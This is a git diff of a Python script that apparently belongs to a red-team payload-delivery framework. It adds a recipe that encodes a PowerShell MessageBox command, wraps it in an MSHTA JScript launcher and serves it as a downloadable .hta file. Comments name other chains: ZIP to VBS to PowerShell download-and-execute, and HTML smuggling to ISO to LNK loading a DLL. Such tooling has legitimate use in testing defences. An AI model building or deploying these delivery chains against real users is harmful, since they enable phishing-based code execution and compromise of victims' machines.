@@ -4,13 +4,32 @@ from make.iso.iso import makeIso
 from make.powershell.powershell import *
 from make.zip.zip import makeZip
 from make.vbs.vbs import *
+from make.mshta.mshta import *
 
 from helpers import readFileContent, saveAceFile, makeAceFile
-from model import AceFile, AceRoute, PluginDecorator, enableOut
+from model import AceFile, AceRoute
 from web import serve
 
+def recepi_3():
+    # MSHTA -> Powershell:MessageBox
+    routes = []
 
-def recepi_1():
+    # PS-A
+    ps1msgbox = makePowershellMessageBox()
+    ps1msgbox = makePowershellEncodedCommand(ps1msgbox)
+
+    # MSHTA
+    cmd = "powershell.exe -EncodedCommand {}".format(ps1msgbox)
+    mshta = makeMshtaJscriptExec(cmd)
+
+    containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
+    routes.append(containerServe)
+
+    # start
+    serve(routes)
+
+
+def recepi_2():
     # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
     routes = []
 
@@ -42,7 +61,7 @@ def recepi_1():
     serve(routes)
 
 
-def recepi_2():
+def recepi_1():
     # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )
 
     # DLL
